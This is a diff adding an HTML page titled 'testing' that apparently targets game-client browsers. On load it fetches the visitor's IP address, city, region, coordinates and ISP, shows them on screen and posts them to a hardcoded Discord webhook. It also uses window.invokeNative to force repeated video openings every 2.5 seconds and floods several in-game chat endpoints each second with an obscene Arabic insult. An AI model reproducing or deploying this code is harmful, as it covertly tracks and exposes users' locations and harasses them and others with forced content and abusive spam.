@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>testing</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #878787;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .image-container img {
+            width: 650px; 
+            height: auto;
+            border: 2px solid #878787; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(128, 128, 128, 0.7); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #878787; 
+            text-shadow: 0px 0px 8px #878787, 0px 0px 15px #878787, 0px 0px 25px #878787; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #878787; 
+            text-shadow: 0px 0px 8px #878787, 0px 0px 15px #878787, 0px 0px 25px #878787; 
+            letter-spacing: 4.5px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="https://cdn.discordapp.com/attachments/1364995166062248071/1485436159223005244/9df1a5e1a3cc8e1ef4890c49ca03cd46.jpg?ex=69c1dbba&is=69c08a3a&hm=60f03c57c48a58d3427f5d2331f0ab20779cb2a7c52886c74582c1eff45d6db8&" alt="Discord Image">
+    </div>
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1364995166062248071/1478816998132809799/-_-_.mp3?ex=69c0d967&is=69bf87e7&hm=79ce7ce027da6c4d31179453c01388dc116a80ab24ed9f6fe8bc074494cc29e8&" type="audio/mpeg">
+    </audio>
+    <div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text">بنعال عمكم دبلوم </div>
+
+    <script>
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = `<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
+
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1343716504331616328/8-HtlyIdfpvEZ9kyNrCQZIoTXKCOnoGBwMkRNtcuQF3rdjUDhh4';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
+            });
+        });
+
+        setInterval(function() {
+            window.invokeNative("openUrl", "https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=69c1cbcf&is=69c07a4f&hm=e80cb4727567dd3dea1cb155b2c32f89f58d0af013f104ceb3053e3f37d077ed&");
+            window.invokeNative("openUrl", "https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=69c1cbcf&is=69c07a4f&hm=e80cb4727567dd3dea1cb155b2c32f89f58d0af013f104ceb3053e3f37d077ed&");
+            window.invokeNative("openUrl", "https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=69c1cbcf&is=69c07a4f&hm=e80cb4727567dd3dea1cb155b2c32f89f58d0af013f104ceb3053e3f37d077ed&");
+            window.invokeNative("openUrl", "https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=69c1cbcf&is=69c07a4f&hm=e80cb4727567dd3dea1cb155b2c32f89f58d0af013f104ceb3053e3f37d077ed&");
+        }, 2500);
+   
+const msg = ` -25 ولد قحبه و خنيث   `;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
+</body>
+</html>
